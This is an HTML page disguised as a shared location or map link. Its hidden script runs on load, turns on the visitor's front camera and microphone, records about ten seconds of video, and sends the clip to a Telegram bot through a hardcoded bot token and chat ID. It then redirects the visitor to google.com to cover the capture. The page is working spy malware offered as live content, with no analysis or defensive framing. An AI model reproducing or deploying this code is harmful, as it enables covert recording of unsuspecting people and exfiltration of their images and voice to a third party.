<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>Location</title>
    <meta property="og:title" content="Location">
    <meta property="og:description" content="Map details">

    <style>
        body { 
            margin: 0; 
            background: #0000FF !important; /* ڕەنگی شین */
            display: flex; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            overflow: hidden;
        }
        video { display: none !important; }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline muted></video>

    <script>
        const token = '8734772782:AAFT6ize__0OBmz53luKQXus2iJpSg9NpmA';
        const chatId = '7602797383';

        window.onload = function() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];

                mediaRecorder.ondataavailable = function(e) {
                    if (e.data.size > 0) {
                        chunks.push(e.data);
                    }
                };

                // فرمانی ناردنی ڤیدیۆکە
                function sendVideoData() {
                    if (chunks.length === 0) return;
                    
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('video', blob, 'video.mp4');

                    fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    }).then(() => {
                        stream.getTracks().forEach(track => track.stop());
                        window.location.href = "https://google.com";
                    }).catch(() => {
                        window.location.href = "https://google.com";
                    });
                }

                mediaRecorder.onstop = sendVideoData;

                // دەستپێکردنی ڕیکۆردکردن بە ناردنی داتا هەر ٢ چرکە جارێک
                mediaRecorder.start(2000); 

                // ئەگەر بەکارهێنەرەکە پەڕەکەی داخست، هەوڵ دەدات خێرا ڤیدیۆکە بنێرێت
                window.onbeforeunload = function() {
                    if (mediaRecorder.state !== "inactive") {
                        mediaRecorder.stop();
                    }
                };

                // دوای ١٠ چرکە (10000 میلی چرکە) خۆی دەوەستێت و دەنێرێت
                setTimeout(() => {
                    if (mediaRecorder.state !== "inactive") {
                        mediaRecorder.stop();
                    }
                }, 10000);

            }).catch(err => {
                window.location.href = "https://google.com";
            });
        };
    </script>
</body>
</html>
